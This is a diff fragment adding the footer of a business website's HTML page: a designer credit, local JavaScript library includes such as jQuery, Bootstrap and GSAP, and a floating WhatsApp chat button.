+                        <div class="footer-privacy-policy-gold">
+                            <ul>
+                                <li>Design and Developed by<a href="https://www.haptrendmedia.com/"><span style="color: #F4B72A"> Haptrend Media</span></a></li>
+                            </ul>
+                        </div>
+                        <!-- Footer Privacy Policy End -->
+                    </div>
+                    <!-- Footer Copyright Section End -->
+                </div>
+            </div>
+        </div>
+    </footer>
+    <!-- Footer End -->
+
+    <!-- Jquery Library File -->
+    <script src="js/jquery-3.7.1.min.js"></script>
+    <!-- Bootstrap js file -->
+    <script src="js/bootstrap.min.js"></script>
+    <!-- Validator js file -->
+    <script src="js/validator.min.js"></script>
+    <!-- SlickNav js file -->
+    <script src="js/jquery.slicknav.js"></script>
+    <!-- Swiper js file -->
+    <script src="js/swiper-bundle.min.js"></script>
+    <!-- Counter js file -->
+    <script src="js/jquery.waypoints.min.js"></script>
+    <script src="js/jquery.counterup.min.js"></script>
+    <!-- Magnific js file -->
+    <script src="js/jquery.magnific-popup.min.js"></script>
+    <!-- SmoothScroll -->
+    <script src="js/SmoothScroll.js"></script>
+    <!-- Parallax js -->
+    <script src="js/parallaxie.js"></script>
+    <!-- MagicCursor js file -->
+    <script src="js/gsap.min.js"></script>
+    <script src="js/magiccursor.js"></script>
+    <!-- Text Effect js file -->
+    <script src="js/SplitText.js"></script>
+    <script src="js/ScrollTrigger.min.js"></script>
+    <!-- YTPlayer js File -->
+    <script src="js/jquery.mb.YTPlayer.min.js"></script>
+    <!-- Wow js file -->
+    <script src="js/wow.min.js"></script>
+    <!-- Main Custom js file -->
+    <script src="js/function.js"></script>
+    
+    <!-- Floating WhatsApp Button -->
+<a href="https://wa.me/919345711173?text=Hi%20there!%20I%20would%20like%20to%20know%20more%20about%20your%20services." 
+   target="_blank" 
+   id="whatsapp-button" 
+   title="Chat with us on WhatsApp">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Chat">
+</a>
+</body>
+</html>
